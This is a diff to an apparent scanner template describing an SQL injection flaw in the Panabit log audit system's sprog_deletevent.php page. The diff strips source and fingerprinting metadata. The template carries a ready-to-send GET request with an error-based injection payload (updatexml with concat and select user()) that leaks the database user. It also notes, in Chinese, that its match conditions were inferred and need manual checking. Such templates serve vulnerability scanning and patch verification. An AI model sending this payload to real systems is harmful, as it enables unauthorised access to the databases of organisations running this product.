@@ -3,14 +3,8 @@ info:
   name: panabit日志审计系统sprog_deletevent存在SQL注入漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/844e27623eb70325277b81d134aaea72
-
-    [!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  description: '[!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
   tags: sqli,2025
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: 844e27623eb70325277b81d134aaea72
-    fofa: + hunter`app.name="Panabit 日志系统"`
 http:
 - raw:
   - 'GET /Maintain/sprog_deletevent.php?openid=1&id=1%20or%20updatexml(1,concat(0x7e,(select+user())),0)&cloudip=1 HTTP/1.1
